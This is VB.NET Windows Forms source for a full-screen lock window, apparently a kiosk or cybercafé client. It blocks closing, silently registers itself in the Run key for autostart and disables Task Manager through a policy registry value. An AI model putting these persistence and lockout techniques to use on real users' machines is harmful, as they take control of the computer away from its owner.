Imports Microsoft.Win32
Imports Microsoft.Win32.Registry

Public Class Form1
    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing

        If (e.CloseReason = CloseReason.UserClosing) Then
            e.Cancel = True
            MessageBox.Show("No tiene Autorización para realizar esta acción", "Securidad", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If
    End Sub
    Private Sub start_Up(ByVal bCrear As Boolean)
        Const CLAVE As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        Dim subClave As String = Application.ProductName.ToString
        Dim msg As String = ""
        Try
            Dim Registro As RegistryKey = CurrentUser.CreateSubKey(CLAVE, RegistryKeyPermissionCheck.ReadWriteSubTree)
            With Registro
                .OpenSubKey(CLAVE, True)
                Select Case bCrear
                    Case True
                        .SetValue(subClave, _
                                  Application.ExecutablePath.ToString)
                End Select
            End With
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None
        Me.TopMost = True
        Me.WindowState = FormWindowState.Maximized
        Button1.Anchor = AnchorStyles.Right Or AnchorStyles.Top
        Button2.Anchor = AnchorStyles.Right Or AnchorStyles.Bottom
        Button3.Anchor = AnchorStyles.Right Or AnchorStyles.Bottom
        Label1.Anchor = AnchorStyles.Top
        If (My.Settings.inicio = False) Then
            Try
                start_Up(True)
                My.Settings.inicio = True
            Catch ex As Exception
            End Try
        Else
        End If
        If (My.Settings.admin = False) Then
            Try
                Dim REGISTRADOR As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
                REGISTRADOR.SetValue("DisableTaskMgr", 1)
                My.Settings.admin = True
            Catch ex As Exception
            End Try
        Else
        End If

    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Try
            Process.Start(Application.StartupPath + "\controler.exe")
        Catch ex As Exception
        End Try

    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Process.Start("CMD.exe", "/C shutdown /s /f")
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Process.Start("CMD.exe", "/C shutdown /r")
    End Sub
End Class
